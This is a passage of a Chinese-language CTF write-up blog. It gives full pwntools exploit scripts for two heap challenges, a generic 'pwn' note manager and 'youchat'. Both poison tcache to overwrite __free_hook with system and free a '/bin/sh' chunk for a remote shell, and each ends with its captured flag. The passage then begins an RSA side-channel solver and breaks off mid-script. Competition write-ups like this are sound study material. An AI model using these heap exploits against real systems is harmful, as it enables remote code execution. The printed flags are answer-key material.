class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li  = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;121.36.245.213&quot;</span></span><br><span class="line">server_port = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">i, size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">i, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0xf0</span>)</span><br><span class="line">	ad(<span class="number">3</span>, <span class="number">0xf0</span>)</span><br><span class="line">	ad(<span class="number">4</span>, <span class="number">0xf0</span>)</span><br><span class="line">	ad(<span class="number">5</span>, <span class="number">0xf0</span>)</span><br><span class="line">	ad(<span class="number">6</span>, <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">	p = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x511</span>)</span><br><span class="line">	md(<span class="number">0x0</span>, p)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">	dp(<span class="number">1</span>)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	main_arena = <span class="number">0x3afc40</span> <span class="comment">#local</span></span><br><span class="line">	main_arena = <span class="number">0x3ebc40</span></span><br><span class="line">	libc_base = leak - main_arena - <span class="number">0x430</span> - <span class="number">96</span></span><br><span class="line">	free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	p = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x91</span>)</span><br><span class="line">	p += p64(free_hook - <span class="number">8</span>)</span><br><span class="line">	md(<span class="number">0x0</span>, p)</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">	md(<span class="number">1</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">28</span>)</span><br><span class="line">	ad(<span class="number">8</span>, <span class="number">0x80</span>) <span class="comment"># malloc to free_hook</span></span><br><span class="line">	md(<span class="number">8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">	p = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x91</span>)</span><br><span class="line">	p += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	md(<span class="number">0</span>, p)</span><br><span class="line">	db()</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>

<p>flag{ovgwkjRhB0EDgSHvp7ihCGPiRqHGAfUI}</p>
<h1 id="pwn3-youchat"><a href="#pwn3-youchat" class="headerlink" title="pwn3 [youchat]"></a>pwn3 [youchat]</h1><p>当时网络有点差，比赛结束几分钟刚好打通远程，都怪没有看到update功能。。。</p>
<p>这个漏洞在添加用户后，logout用户时，会释放当前内存地址-0x10，若控制好 addr-0x10处的大小，即可控制堆重叠，修改tcache fd为free_hook。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li  = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;124.70.158.59&quot;</span></span><br><span class="line">server_port = <span class="number">30023</span></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, i, d, d2</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, d2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">i, n</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chat</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	add(<span class="number">0</span>, <span class="number">0x81</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x58</span> + p64(<span class="number">0x4B1</span>), <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x81</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x81</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;D&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">3</span>, <span class="number">0x81</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;E&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">4</span>, <span class="number">0x81</span>, <span class="string">&#x27;E&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;F&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">5</span>, <span class="number">0x81</span>, <span class="string">&#x27;F&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;G&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">6</span>, <span class="number">0x81</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;H&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;H&#x27;</span> * <span class="number">0x70</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">	logout(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">8</span>, <span class="number">0x81</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	view(<span class="number">8</span>)</span><br><span class="line">	</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>) </span><br><span class="line">	main_arena = <span class="number">0x3afc40</span> <span class="comment"># local</span></span><br><span class="line">	main_arena = <span class="number">0x3ebc40</span> <span class="comment"># local</span></span><br><span class="line">	libc_base = leak - main_arena - <span class="number">0x3a2</span> - <span class="number">96</span></span><br><span class="line">	free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	sh_str = libc_base +  <span class="number">0x1b40fa</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">9</span>, <span class="number">0x40</span>, <span class="string">b&#x27;O&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>) +  p64(<span class="number">0x91</span>), <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	logout(<span class="number">2</span>)</span><br><span class="line">	add(<span class="number">10</span>, <span class="number">0x30</span>, <span class="string">b&#x27;G&#x27;</span> * <span class="number">0x10</span> + p64(free_hook) + p64(free_hook), p64(free_hook))</span><br><span class="line"></span><br><span class="line">	add(<span class="number">11</span>, <span class="number">0x81</span>, <span class="string">&#x27;F&#x27;</span> * <span class="number">0x1</span>, <span class="string">&#x27;G&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">12</span>, <span class="number">0x81</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]), <span class="string">b&#x27;G&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x81</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span>, <span class="string">&#x27;G&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	update(<span class="number">1</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	logout(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>

<p>flag{KNT5Z3gX6H9Honi5CH18kYHutIp7E8LD}</p>
<h1 id="Crypto3-crypto-lp"><a href="#Crypto3-crypto-lp" class="headerlink" title="Crypto3 [crypto_lp]"></a>Crypto3 [crypto_lp]</h1><p>rsa侧信道攻击</p>
<p>该exp与是happi0师傅合作编写的，两个合作搞了半天，打通后，只打印flag前面部分，后面的数全为空，原因是没有整除查找，输出的是浮点类型的数。。。后面happi0师傅找到了原因并且打通了^_^，自己不懂，先贴着。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">    <span class="keyword">if</span>(LOCAL):</span><br><span class="line">        gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">scret, c</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(scret))</span><br><span class="line">    sl(<span class="built_in">str</span>(c))</span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    cd = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>), <span class="number">10</span>)</span><br><span class="line">    <span class="comment">#li(&#x27;cd: &#x27; + str(c))</span></span><br><span class="line">    <span class="keyword">return</span> cd</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">    nn = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span 